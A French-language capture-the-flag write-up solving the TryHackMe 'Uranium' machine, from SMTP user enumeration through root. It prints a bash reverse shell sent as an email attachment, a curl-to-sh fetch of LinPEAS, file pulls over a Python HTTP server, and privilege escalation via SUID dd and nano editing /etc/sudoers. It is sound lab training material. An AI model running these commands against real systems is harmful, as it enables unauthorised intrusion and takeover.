# CTF Writeup — Uranium 
- Source : **TryHackMe** 
- Niveau : **Hard**
- OS : **Linux**

## Reconnaissance

On commence par un scan **nmap**  pour identifier les services exposés :

```bash
nmap -A 10.128.181.206
```

**Résultats :**
- Port **22/tcp** — SSH (OpenSSH 7.6p1 Ubuntu)
- Port **25/tcp** — SMTP (Postfix smtpd) — certificat SSL avec `CN=uranium`, `DNS:uranium`
- Port **80/tcp** — HTTP (Apache 2.4.29) — titre : *Uranium Coin*

On ajoute l'entrée DNS dans `/etc/hosts` :

```bash
echo "10.128.181.206 uranium.thm" >> /etc/hosts
```

---

## Énumération SMTP (User Enumeration)

On se connecte en telnet sur le port 25 et on utilise la commande `VRFY` pour confirmer l'existence d'utilisateurs :

```
telnet 10.128.181.206 25
VRFY hakanbey   → 252 2.0.0 hakanbey
VRFY root       → 252 2.0.0 root
```

Deux utilisateurs confirmés : **hakanbey** et **root**.

---

## Initial Access — Exploit via sendEmail (CVE SMTP)
On commence par vérifier qu'on peut envoyer des mails sans authentification :
```bash
sendEmail -t hakanbey@uranium.thm -f hakanbey@uranium.thm \
  -s 10.128.181.206 -u "Test Email" -m "lorem ipsum...."
# Mar 23 18:59:52 sendEmail[13577]: Email was sent successfully!
```

Le serveur SMTP accepte les mails sans authentification. On va donc envoyer un mail avec une **pièce jointe malveillante**.

On crée le fichier `application` contenant notre reverse shell :
```bash
echo "bash -c "bash -i >& /dev/tcp/192.168.141.128/4444 0>&1"" > application
```

On ouvre notre listener sur un second terminal, puis on envoie le payload :
```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — envoi du mail avec la pièce jointe
sendEmail -t hakanbey@uranium.thm -f witty@mail.com \
  -s uranium.thm -u "Test app" -m "lorem" \
  -o tls=no -a application
```

On reçoit la connexion sur notre listener :
```bash
connect to [192.168.141.128] from (UNKNOWN) [10.128.181.206] 41928
hakanbey@uranium:~$
```

**Shell obtenu en tant que `hakanbey`.**

---

## User Flag 1

```bash
hakanbey@uranium:~$ ls
chat_with_kral4  mail_file  user_1.txt

hakanbey@uranium:~$ cat user_1.txt
thm{...}
```

---

## Pivoting vers kral4 — Analyse réseau avec LinPEAS
J'heberge un LinPEAS sur ma machine ( 192.168.141.128 ) pour pouvoir le récuperer sur la machine victime

```bash
curl 192.168.141.128/linpeas.sh | sh
```

LinPEAS révèle un fichier intéressant dans `/var/log/` : **`hakanbey_network_log.pcap`**
On va ouvrir un serveur HTTP python pour pouvoir récuperer le fichier qui semble intéressant :

```bash
# Sur la cible
hakanbey@uranium:/var/log$ python3 -m http.server 9000

# Sur notre machine
wget http://uranium.thm:9000/hakanbey_network_log.pcap
```

On ouvre le `.pcap` dans **Wireshark** et on suit le flux TCP. On y trouve une conversation entre `hakanbey` et `kral4` où **kral4 révèle le mot de passe de hakanbey**.

```bash
tshark -r hakanbey_network_log.pcap -q -z follow,tcp,ascii,0
```

```
===================================================================
Follow: tcp,ascii
Filter: tcp.stream eq 0
Node 0: 127.0.0.1:48830
Node 1: 127.0.0.2:13450

Hi Kral4
Hi bro
I forget my password, do you know my password ?
Yes, wait a sec I'll send you.
Oh , yes yes I remember. No need anymore. Ty..
Okay bro, take care !
===================================================================
```


---

## Obtention du mot de passe via chat_with_kral4

Un binaire `chat_with_kral4` est présent dans le home de hakanbey. On l'exécute et on interagit avec kral4 en répondant `yes` à sa question :

```bash
./chat_with_kral4
PASSWORD: MBMD1vdpjg3kGv6SsIz56VNG

kral4: hi hakanbey
-> hi
kral4: how are you?
-> fine
kral4: what now? did you forgot your password again
-> yes
kral4: okay your password is         don't lose it PLEASE
```

kral4 nous donne le mot de passe de hakanbey.
## Sudo lateral movement vers kral4

```bash
hakanbey@uranium:~$ sudo -l
(kral4) /bin/bash

hakanbey@uranium:~$ sudo -u kral4 /bin/bash
kral4@uranium:~$ id
uid=1001(kral4) gid=1001(kral4) groups=1001(kral4)
```

---

## User Flag 2

```bash
kral4@uranium:/home/kral4$ cat user_2.txt
thm{...}
```

---

## Web Flag — SUID /bin/dd (GTFOBins)

LinPEAS signale que `/bin/dd` a le bit **SUID**. On consulte [GTFOBins — dd](https://gtfobins.github.io/gtfobins/dd/) pour lire des fichiers en tant que root.

On trouve d'abord le fichier :

```bash
find / -type f -name web_flag.txt 2>/dev/null
/var/www/html/web_flag.txt
```

On lit son contenu via `/bin/dd` :

```bash
/bin/dd if=/var/www/html/web_flag.txt
thm{...}
```

---

## Privilege Escalation vers root — Nano SUID + sudoers
En lisant la boîte mail de kral4 (`/var/mail/kral4`) :
```bash
kral4@uranium:/var/mail$ cat kral4
From root@uranium.thm  Sat Apr 24 13:22:02 2021
...
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi kral4
Date: Sat, 24 Apr 2021 13:22:02 +0000

I give SUID to the nano file in your home folder to fix the attack on our
index.html. Keep the nano there, in case it happens again.
```


Il existe donc un `nano` avec SUID dans `/home/kral4/`. On l'utilise pour **éditer `/etc/sudoers`** :

```bash
kral4@uranium:/home/kral4$ cp /usr/bin/nano . # On ajoute le binaire nano 
kral4@uranium:/home/kral4$ ./nano /etc/sudoers
```

On utilise le binaire nano pour **éditer `/etc/sudoers`** et ajouter les droits root à hakanbey :
```
%hakanbey   ALL=(ALL:ALL) ALL
```

On bascule vers hakanbey puis on escalade en root :

```bash
kral4@uranium:/home/kral4$ su hakanbey
hakanbey@uranium:/home/kral4$ sudo su
root@uranium:/home/kral4# whoami
root
```

---

## Root Flag

```bash
root@uranium:~# cat /root/root.txt
thm{...}
```

---

## Résumé de la chaîne d'exploitation

| Étape | Technique |
|-------|-----------|
| Reconnaissance | Nmap + SMTP VRFY enum |
| Initial Access | sendEmail → Reverse shell via pièce jointe |
| User 1 | Fichier `user_1.txt` dans le home de hakanbey |
| Pivoting | PCAP Wireshark → mot de passe → `chat_with_kral4` → `sudo -u kral4` |
| User 2 | Fichier `user_2.txt` dans le home de kral4 |
| Web Flag | SUID `/bin/dd` (GTFOBins) |
| Root | Nano SUID → édition `/etc/sudoers` → `sudo su` |



